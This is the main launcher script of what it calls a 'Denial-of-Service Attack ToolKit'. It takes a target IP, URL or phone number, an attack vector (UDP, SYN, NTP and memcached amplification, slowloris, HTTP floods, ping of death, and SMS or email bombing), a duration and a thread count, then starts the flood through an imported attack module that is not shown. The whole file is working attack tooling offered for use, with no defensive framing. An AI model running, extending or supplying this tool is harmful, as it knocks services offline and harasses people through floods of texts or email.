#!/usr/bin/python3
import os
import sys
import argparse

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.vector import Attackvector
except   ImportError as  err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

parser = argparse.ArgumentParser(description="Denial-of-Service Attack ToolKit")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target IP:port, url or phone",
)
parser.add_argument(
    "--vector",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Attack vector",
)
parser.add_argument(
    "--time",
    type=int, default=10,
    metavar="<time>",
    help="time in secounds"
)
parser.add_argument(
    "--threads",
    type=int, default=3,
    metavar="<threads>",
    help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
vector = str(args.vector).upper()
target = args.target

if __name__ == "__main__":
    if not vector or not target or not time:
        parser.print_help()
        sys.exit(1)

    with Attackvector(
        duration=time, name=vector, threads=threads, target=target
    ) as Flood:
        Flood.Start()
